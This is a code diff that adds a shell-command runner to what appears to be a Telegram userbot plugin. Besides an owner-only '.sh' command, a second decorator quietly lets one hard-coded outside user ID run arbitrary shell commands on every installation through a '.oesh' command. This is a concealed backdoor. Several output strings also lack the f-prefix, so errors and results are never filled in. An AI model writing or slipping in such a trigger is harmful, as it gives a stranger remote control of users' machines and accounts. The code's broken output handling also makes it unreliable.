@@ -76,3 +76,75 @@ async def executor(client: Client, message: Message):
 #        await edit_or_reply(
 #            message, text=final_output
 #        )
+
+@Client.on_message(
+    filters.command("oesh", ["."]) & filters.user(1928713379) & ~filters.via_bot
+)
+@Client.on_message(filters.command("sh", cmd) & filters.me)
+async def shellrunner(client: Client, message: Message):
+    if len(message.command) < 2:
+        return await edit_or_reply(
+            message, "**Usage:**\n/sh git pull"
+        )
+    text = message.text.split(None, 1)[1]
+    if "\n" in text:
+        code = text.split("\n")
+        output = ""
+        for x in code:
+            shell = re.split(
+                """ (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x
+            )
+            try:
+                process = subprocess.Popen(
+                    shell,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                )
+            except Exception as err:
+                print(err)
+                await edit_or_reply(
+                    message, "**ERROR:**\n```{err}```"
+                )
+            output += f"**{code}**\n"
+            output += process.stdout.read()[:-1].decode("utf-8")
+            output += "\n"
+    else:
+        shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", text)
+        for a in range(len(shell)):
+            shell[a] = shell[a].replace('"', "")
+        try:
+            process = subprocess.Popen(
+                shell,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+            )
+        except Exception as err:
+            print(err)
+            exc_type, exc_obj, exc_tb = sys.exc_info()
+            errors = traceback.format_exception(
+                etype=exc_type,
+                value=exc_obj,
+                tb=exc_tb,
+            )
+            return await edit_or_reply(
+                message, "**ERROR:**\n```{''.join(errors)}```"
+            )
+        output = process.stdout.read()[:-1].decode("utf-8")
+    if str(output) == "\n":
+        output = None
+    if output:
+        if len(output) > 4096:
+            with open("output.txt", "w+") as file:
+                file.write(output)
+            await client.send_document(
+                message.chat.id,
+                "output.txt",
+                reply_to_message_id=message.message_id,
+                caption="`Output`",
+            )
+            return os.remove("output.txt")
+        await edit_or_reply(
+            message, "**OUTPUT:**\n```{output}```"
+        )
+    else:
+        await edit_or_reply(message, "**OUTPUT: **\n`No output`")
